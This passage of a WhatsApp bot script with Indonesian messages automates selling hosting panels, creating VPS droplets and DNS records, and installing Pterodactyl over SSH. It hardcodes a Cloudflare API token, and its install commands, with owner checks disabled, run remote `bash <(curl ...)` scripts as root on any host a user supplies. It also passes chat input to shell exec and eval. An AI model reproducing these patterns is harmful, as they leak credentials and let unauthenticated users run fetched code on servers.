                                            ...(await prepareWAMessageMedia({
                                                image: global.imgmenu,
                                            }, {
                                                upload: RuzXD.waUploadToServer
                                            }))
                                        }),
                                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                                            buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "LIST PANEL",
                                    sections: [{
		title: 'RuztanXD', 
		rows: [{
	    title: '🔐 PANEL PAKET 1 🔐',
    	description: `Panel Privat Ram 1gb (Rp 2.000)`, 
    	id: `${prefix}belipanel 1gb`
        },
        {
		title: '🔐 PANEL PAKET 2 🔐', 
		description: "Panel Privat Ram 2gb (Rp 3.000)", 
		id: `${prefix}belipanel 2gb`
	    },
         {
         title: '🔐 PANEL PAKET 3 🔐',
         description: "Panel Privat Ram 3gb (Rp 4.000)",
        id: `${prefix}belipanel 3gb`
        },
        {
		title: '🔐 PANEL PAKET 4 🔐', 
		description: "Panel Privat Ram 4gb (Rp 5.000)", 
		id: `${prefix}belipanel 4gb`
	    },
	    {
		title: '🔐 PANEL PAKET 5 🔐', 
		description: "Panel Privat Ram 5gb (Rp 6.000)", 
		id: `${prefix}belipanel 5gb`
	    },
	    {
		title: '🔐 PANEL PAKET 6 🔐', 
		description: "Panel Privat Ram 6gb (Rp 7.000)", 
		id: `${prefix}belipanel 6gb`
	    },
	    {
		title: '🔐 PANEL PAKET 7 🔐', 
		description: "Panel Privat Ram 7gb (Rp 8.000)", 
		id: `${prefix}belipanel 7gb`
	    },
	    {
		title: '🔐 PANEL PAKET 8 🔐', 
		description: "Panel Privat Ram 8gb (Rp 9.000)", 
		id: `${prefix}belipanel 8gb`
	    },
	    {
		title: '🔐 PANEL PAKET 9🔐', 
		description: "Panel Privat Ram UNLI (Rp 10.000)", 
		id: `${prefix}belipanel unli`
	    }]
}]

                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "TESTI 🤖",
                                    url: "https://whatsapp.com/channel/0029VaR9k3rG3R3n7N3jAi1T",
                                    merchant_url: "https://whatsapp.com/channel/0029VaR9k3rG3R3n7N3jAi1T"
                                })        
                                }, 
                               {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "You Tube 💌",
                                    url: global.linkyt,
                                    merchant_url: global.linkyt
                                })
                            }
                        ]
                                        })
                                    }
                                ]
                            })
                        })
                    }
                }
            }, {})

            await RuzXD.relayMessage(
            m.chat, msg.message, {
            messageId: msg.key.id
                })              
}
break
case "buyvps": {
  if (!isOwner) return reply(msg.owner);
  
  let teks = `
  *#- List ram yang tersedia*
   
  - 4GB
  - 8GB
  - 16GB
  
  Contoh penggunaan: *.cvps 4gb namadomain*
  `;
  
  if (!text) return m.reply(teks);

  let args = text.split(" ");
  let cmd = args[0]?.toLowerCase();
  let domain = args[1]?.toLowerCase();

  if (!domain || !domain.match(/^[a-z0-9-]+$/)) 
    return m.reply("Nama domain tidak valid. Pastikan hanya menggunakan huruf, angka, dan tanda '-'.");

  let Obj = {};
  if (cmd == "4gb") {
    Obj.nama = "root";
    Obj.ram = "s-2vcpu-4gb";
    Obj.harga = "40000"; // harga vps
  } else if (cmd == "8gb") {
    Obj.nama = "root";
    Obj.ram = "s-4vcpu-8gb";
    Obj.harga = "50000"; // harga vps
  } else if (cmd == "16gb") {
    Obj.nama = "root";
    Obj.ram = "s-4vcpu-16gb";
    Obj.harga = "70000"; //harga vps
  } else return m.reply(teks);
function generateRandomNumber(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

let amount = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://ruztan.apixd.my.id/api/orkut/createpayment?apikey=echa&amount=${amount}&codeqr=${global.qrisOrderKuota}`)
const teks3 = `
*▧ INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* Panel Pterodactyl
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await RuzXD.sendMessage(m.chat, {image: {url: get.data.result.qrImageUrl}, caption: teks3}, {quoted: m})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(15000)
const resultcek = await axios.get(`https://ruztan.apixd.my.id/api/orkut/cekstatus?apikey=echa&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data.amount
if (db.users[m.sender].saweria && req == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await RuzXD.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Panel Pterodactyl
 *• Payment :* ${resultcek.data.brand_name}
`}, {quoted: db.users[m.sender].saweria.msg})
  try {
    // VPS Creation
    let dropletData = {
      name: domain,
      region: 'sgp1',
      size: Obj.ram,
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['Ruztan']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apido
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      m.reply(`\`\`\`Tunggu Sebentar...\`\`\``);
      await new Promise(resolve => setTimeout(resolve, 60000));

      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + global.apido
        }
      });

      let dropletData = await dropletResponse.json();
      let ipVPS = dropletData.droplet.networks.v4[0].ip_address;

      // Domain Creation
      async function createSubDomain(host, ip) {
        let zone = "65f9c8f5bbfcf48b383e69f03d09d51f";
        let apitoken = "3zIjp0vz8U0K4neBBG1wief5xHtrOjznZw3kQLiS";
        let tld = "ruzpanel.web.id";
        try {
          let res = await axios.post(
            `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
            {
              type: "A",
              name: `${host}.${tld}`,
              content: ip,
              ttl: 3600,
              proxied: false
            },
            {
              headers: {
                Authorization: "Bearer " + apitoken,
                "Content-Type": "application/json"
              }
            }
          );
          return res.data.success ? res.data.result.name : null;
        } catch (e) {
          console.error(e.response?.data || e);
          return null;
        }
      }

      let subdomain1 = await createSubDomain(domain, ipVPS);
      let subdomain2 = await createSubDomain(`node.${domain}`, ipVPS);
//onst IpVPSS =
      
    let messageText = `*VPS berhasil dibuat √\`*\n\n`;
      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n\n`;
      messageText += `*\`SUBDOMAIN\`*\n- ${subdomain1}\n- ${subdomain2}\n\n`;
      messageText += `*\`SPEKTIFIKASI\`*\nRAM: ${Obj.ram}\n\n*©RuztanXD*\n\n STEP SELANJUTNYA INSTALL PANEL TUNGGU 4MENIT UNTUK MEMULAI INSTAL PANEL`;

      await RuzXD.sendMessage(m.chat, { text: messageText });
  
await sleep(240000)
  await m.reply(`${prefix}installpanel ${ipVPS},${password},${subdomain1},${subdomain2},80000`)
        
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
      } catch (err) {
    console.error(err);
    m.reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }
  await RuzXD.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}}
break;
case 'installpanel': {
  //  if (!isOwner) return reply(msg.owner);
    let t = text.split(',');
    if (t.length < 5) return reply(`*Format salah!*\nPenggunaan: ${prefix}installpanel ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        reply('*PROSES PENGINSTALLAN PANEL SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        reply('*PROSES PENGINSTALLAN WINGS SEDANG BERLANGSUNG MOHON TUNGGU 5-10MENIT*');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)';
        reply('*MEMULAI CREATE NODE & LOCATION*');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        reply(`*DATA PANEL ANDA*\n\n*USERNAME:* ruztan\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('ruztan\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('A\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write('RuztanXD\n');
        stream.write('4\n');
        stream.write('RuztanXD\n');
        stream.write('Numpang Gk ush banyak gaya\n');
        stream.write(`${domainnode}\n`);
        stream.write('Ruztan\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  
case 'startwings': case 'configurewings': {
 //   if (!isOwner) return reply(msg.owner);
    
    let t = text.split(',');
    if (t.length < 2) return reply(`*Format salah!*\nPenggunaan: ${cmd} ipvps,password,token (token configuration)`)
    
    let ipvps = t[0];
    let passwd = t[1];
    let token = t[2];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Gunakan string terenkripsi di kode Anda
    const command = 'bash <(curl https://raw.githubusercontent.com/RuztanHosting/RuzPrivat/main/install.sh)'
    const conn = new Client();
 
    conn.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        reply('*PROSES START WINGS*')
        
        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
reply('*SUKSES CEK COBA OM IJO GK?😈*');
                conn.end();
            }).on('data', (data) => {
            stream.write('RuztanXD\n');
                stream.write('3\n');
                stream.write(`${token}\n`)
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        reply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   }

break
case "deldroplet": {
  if (!isOwner) return reply(msg.owner);
  let dropletId = args[0];
  if (!dropletId) return reply('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${apido}`
        }
      });

      if (response.ok) {
        reply('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();
}
break
case "tebakjkt48": {
  if (m.isGroup) return m.reply("Permainan Tebak JKT48 hanya bisa dimainkan di private chat!");
  const members = await fetchJKT48Members();
  if (members.length === 0) {
    return m.reply("Gagal mengambil data anggota JKT48. Coba lagi nanti.");
  }
  const randomMember = members[Math.floor(Math.random() * members.length)];
  global.currentAnswer = randomMember.name;
  const caption = `🔍 *Tebak Siapa Dia?*\nTebak nama lengkap anggota JKT48 ini!\nketik *.bantuan*\nuntuk melihat inisial nya\nketik .jawab\nuntuk jawab soal nya .jawab freya`;
  await RuzXD.sendMessage(m.chat, {
    image: { url: randomMember.image },
    caption: caption,
  }, { quoted: m });
}
break;
case "jawab": {
  if (!global.currentAnswer) {
    return m.reply("Tidak ada permainan yang sedang berlangsung. Ketik *!tebakjkt48* untuk memulai permainan.");
  }
  const userAnswer = m.text.slice(7).trim().toLowerCase();
  if (userAnswer === global.currentAnswer.toLowerCase()) {
    m.reply(`🎉 Benar! Ini adalah *${global.currentAnswer}*.\nKetik *!tebakjkt48* untuk bermain lagi.`);
    global.currentAnswer = null; // Reset jawaban
  } else {
    m.reply("❌ Salah! Coba lagi.");
  }
}
break;
case "bantuan": {
  if (!global.currentAnswer) {
    return m.reply("Tidak ada permainan yang sedang berlangsung. Ketik *!tebakjkt48* untuk memulai permainan.");
  }
  const hint = global.currentAnswer.slice(0, 2) + "****"; 
  m.reply(`Petunjuk: Nama anggota dimulai dengan *${hint}*`);
}
break;

default:


RuzXD.Shikimori = RuzXD.Shikimori ? RuzXD.Shikimori : {};
    if (m.isBaileys && m.fromMe) return;
    if (!m.text) return;
    if (!RuzXD.Shikimori[sender]) return;

    if (
        m.text.startsWith(".") ||
        m.text.startsWith("#") ||
        m.text.startsWith("!") ||
        m.text.startsWith("/") ||
        m.text.startsWith("\\/")
    ) return;

    if (RuzXD.Shikimori[sender] && m.text) {
        let name = RuzXD.getName(sender);
        //await RuzXD.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }});

        const prompt = `Nama Lu Pasti RuztanXD, Aku Sendiri Adalah: RuzXD Di Buat Oleh RuztanXD Diciptakan Untuk Permudah Apa Saja, Aku Tinggal Di Depok, Script ini Di Buat Sama RuztanXD Ya Jika Berminat Gas kontak wa.me/6285824689238`;
        const apiUrl = `https://widipe.com/prompt/gpt?prompt=${encodeURIComponent(prompt)}&text=${encodeURIComponent(m.text)}`;

        try {
            const response = await axios.get(apiUrl, {
                headers: { 'accept': 'application/json' }
            });

            const responseData = response.data;
            const answer = responseData.result;
            //await RuzXD.sendMessage(m.chat, { react: { text: `✅`, key: m.key }});
            m.reply(answer);
            RuzXD.Shikimori[sender].messages = [
                { role: "system", content: `Halo, saya Shikimori Asistent, dikembangkan oleh RuztanXD Anda sedang berbicara dengan ${name}` },
                { role: "user", content: m.text }
            ];
        } catch (error) {
            console.error("Error fetching data:", error);
            m.reply("Maaf, terjadi kesalahan saat memproses permintaan Anda.");
        }
    }

RuzXD.menfess = RuzXD.menfess ? RuzXD.menfess : {}
         let mf = Object.values(RuzXD.menfess).find(v => !v.status && v.receiver == m.sender)
         if (mf && body) {
             if (m.isGroup) return reply(`Balas Pesan Menfess Mu Di Private Chat`)
            if (!/conversation|extended/.test(m.mtype)) return reply(`Balas dengan teks biasa.`)
            let text = `😄 Hai kak, kamu menerima pesan balasan nih dari ${mf.receiver.split('@')[0]} pesannya : *${body}*`
            await RuzXD.sendMessage(mf.from, { text: text }).then(async () => {
               reply(`Berhasil Terkirim!!`)
               await sleep(1000)
               delete RuzXD.menfess[mf.id]
               return !0
            })
         }     

if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return RuzXD.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return RuzXD.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
RuzXD.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
RuzXD.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return RuzXD.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return RuzXD.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

}} catch (e) {
console.log(e)
RuzXD.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}

Command From : ${m.sender.split("@")[0]}`}, {quoted: m})
}}

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})
